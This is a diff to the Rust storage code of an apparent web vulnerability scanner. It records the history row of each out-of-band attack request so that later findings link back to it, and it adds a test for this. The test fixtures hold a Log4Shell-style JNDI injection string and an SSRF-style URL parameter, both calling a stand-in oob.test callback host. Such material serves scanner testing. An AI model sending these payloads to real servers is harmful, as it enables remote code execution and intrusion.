@@ -87,7 +87,7 @@ pub const PAYLOAD_COLUMNS: &[(&str, &str, &str)] = &[
     ("origin", "TEXT", "Attacked origin (scheme://host:port)"),
     ("request", "BLOB", "Attack request"),
     ("response", "BLOB", "Attack response, if one arrived"),
-    ("history_id", "INTEGER", "History row of the attack once an interaction raised a finding"),
+    ("history_id", "INTEGER", "History row of the attack request"),
     ("note", "TEXT", "Note given to `oob payload`"),
     ("check_json", "TEXT", "Declarative check payloads: alert and interactsh matchers an interaction must pass"),
 ];
@@ -237,6 +237,9 @@ pub struct ScanPayload<'a> {
     pub request: &'a [u8],
     pub response: Option<&'a [u8]>,
     pub duration_ms: Option<i64>,
+    /// The attack's history row, recorded as it went out. Without one, the first finding
+    /// it raises records the attack.
+    pub history_id: Option<i64>,
     /// Declarative checks: see `checks::interaction_matches`.
     pub check: Option<&'a str>,
 }
@@ -259,8 +262,8 @@ impl Store {
         self.conn.execute(
             "INSERT OR IGNORE INTO oob_payloads
                 (token, source, rule_id, alert_ref, param, attack, other_info, origin, request, response, duration_ms,
-                 check_json)
-             VALUES (?1, 'scan', ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11)",
+                 history_id, check_json)
+             VALUES (?1, 'scan', ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
             params![
                 p.token,
                 p.rule_id,
@@ -272,6 +275,7 @@ impl Store {
                 p.request,
                 p.response,
                 p.duration_ms,
+                p.history_id,
                 p.check
             ],
         )?;
@@ -609,6 +613,7 @@ mod tests {
                 request: req.as_bytes(),
                 response: Some(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"),
                 duration_ms: Some(3),
+                history_id: None,
                 check: None,
             })
             .unwrap();
@@ -647,6 +652,40 @@ mod tests {
         assert_eq!(ro.rows[0][0], "q");
         assert_eq!(ro.rows[0][1], "");
         assert!(ro.rows[0][2].as_str().unwrap().contains("Received dns interaction from 10.0.0.1:5353"));
+    }
+
+    /// An attack recorded as it went out backs its finding with that row, not a second one.
+    #[test]
+    fn a_recorded_attack_backs_its_finding_with_its_own_row() {
+        let mut store = Store::open_in_memory().unwrap();
+        let target = Target::from_url("http://app.test/").unwrap();
+        let tok = new_token().unwrap();
+        let req = format!("GET /?q=${{jndi:ldap://{tok}.oob.test/a}} HTTP/1.1\r\nHost: app.test\r\n\r\n");
+        let resp: &[u8] = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
+        let row = store.record(&Capture::new("scan", &target, req.as_bytes(), Some(resp), Some(3), None)).unwrap();
+        store
+            .oob_add_scan_payload(&ScanPayload {
+                token: &tok,
+                rule_id: 40043,
+                alert_ref: "40043-1",
+                param: "q",
+                attack: "${jndi:...}",
+                other_info: "",
+                target: &target,
+                request: req.as_bytes(),
+                response: Some(resp),
+                duration_ms: Some(3),
+                history_id: Some(row),
+                check: None,
+            })
+            .unwrap();
+        let q = format!("A {tok}.oob.test");
+        store.oob_add_interaction("dns", "10.0.0.1:5353", &q, q.as_bytes()).unwrap();
+        let c = correlate(&mut store, |r| (r == "40043-1").then_some(&DEF)).unwrap();
+        assert_eq!(c.new_findings, 1, "{c:?}");
+        assert_eq!(store.max_history_id().unwrap(), row);
+        let f = store.query("SELECT history_id FROM findings WHERE alert_ref = '40043-1'", &[], 10, 100).unwrap();
+        assert_eq!(f.rows[0][0], row);
     }
 
     #[test]
@@ -692,6 +731,7 @@ mod tests {
                 request: format!("GET /?u=http://{tok}.oob.test/ HTTP/1.1\r\nHost: app.test\r\n\r\n").as_bytes(),
                 response: None,
                 duration_ms: None,
+                history_id: None,
                 check: Some(&check),
             })
             .unwrap();
